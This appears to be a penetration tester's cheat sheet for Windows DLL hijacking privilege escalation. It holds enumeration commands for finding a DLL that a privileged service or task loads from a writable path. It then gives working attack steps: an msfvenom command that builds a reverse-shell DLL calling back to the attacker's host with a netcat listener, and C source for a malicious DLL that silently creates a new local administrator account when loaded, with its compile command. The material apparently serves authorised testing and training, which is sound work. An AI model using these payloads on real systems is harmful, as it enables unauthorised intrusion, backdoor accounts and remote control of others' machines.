# DLL hijacking checks

Needs: privileged launcher + exact DLL request + writable location in its real search order + trigger.
- Match architecture; KnownDLLs and already-loaded modules change the search order.

## Find a candidate
```powershell
Get-CimInstance -ClassName Win32_Service | Select-Object Name,State,StartName,PathName
Get-ScheduledTask | Select-Object TaskName,Actions,Principal
icacls 'C:\Path\To\Application'
```
Known service/task when broad enumeration is blocked:
```powershell
sc.exe qc <SERVICE>
schtasks.exe /query /tn '<TASK>' /fo LIST /v
```
On Kali, on a copy of the exe (UTF-16LE: plain `strings` misses Windows `LoadLibrary` names):
```bash
strings -a -e l scheduler.exe | rg -i '\.dll'
```
```powershell
.\Find-ExecutableReferences.ps1 'C:\Path\To\application.exe'
```
- String hits are candidates only. Procmon: filter `CreateFile` by process + `NAME NOT FOUND` DLL path; confirm the writable directory is searched first.
- Script: [Find-ExecutableReferences.ps1](../scripts/Find-ExecutableReferences.ps1).

## Plant and trigger
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=<PORT> \
  -f dll -o <MISSING-DLL-NAME>.dll
nc -lvnp <PORT>
```
- Exact DLL name, matching architecture. Copy it to the confirmed path, trigger the launcher, check `whoami`.
- Keep the original file if one existed; remove your test DLL afterwards.
- A bare msfvenom DLL often crashes the host process (no real export table, no `DllMain`): if the launcher dies instead of running your payload, use the custom DLL below.
- icacls legend, local-admin payload template: [service-binary-hijacking.md](service-binary-hijacking.md#icacls-rights-legend).

## Custom DLL (survives the host process)
```c
#include <windows.h>
#include <stdlib.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        system("net user <LOCAL-USER> <PW> /add");
        system("net localgroup administrators <LOCAL-USER> /add");
    }
    return TRUE;
}
```
```bash
x86_64-w64-mingw32-gcc -shared -o <MISSING-DLL-NAME>.dll payload.c
```
- Runs on `DLL_PROCESS_ATTACH`, returns `TRUE` so the host keeps loading normally instead of crashing.
